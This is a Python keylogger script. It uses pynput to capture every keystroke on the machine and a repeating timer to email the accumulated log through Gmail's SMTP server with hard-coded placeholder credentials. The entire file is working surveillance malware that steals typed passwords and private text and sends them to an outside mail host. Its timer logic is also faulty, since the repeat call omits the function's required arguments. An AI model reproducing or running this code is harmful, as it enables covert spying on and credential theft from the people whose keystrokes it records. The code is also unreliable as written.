import pynput.keyboard
import smtplib
import threading

log = ""
user_email = "user@gmail.com"
user_passwd = "password"
gmail_host = "smtp.gmail.com"

def monitoring_keyboard(key):
    global log
    try:
        log += str(key.char)
        #log = log.encode("utf-8") + key.char.encode("utf-8")   #convert from str to byte
    except AttributeError:
        #You can see what error that we get
        #print(key)
        attribute_key = str(key)
        keys = attribute_key.split(".")
        log += keys[1]
    except:
        pass
    print(log)

#gmail SMTP server name: smtp.gmail.com
#gmail SMTP server port: 465 and 587
def send_email(email,password,message):
    email_server = smtplib.SMTP(host=gmail_host,port=587)
    email_server.starttls() #secure connection for gmail
    email_server.login(email, password)
    email_server.sendmail(from_addr=email,to_addrs=email,msg=message)
    email_server.quit()

def thread_function(email,password):
    global log
    send_email(email, password, log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=monitoring_keyboard)

#threading
with keylogger_listener:
    thread_function(user_email, user_passwd)
    keylogger_listener.join()



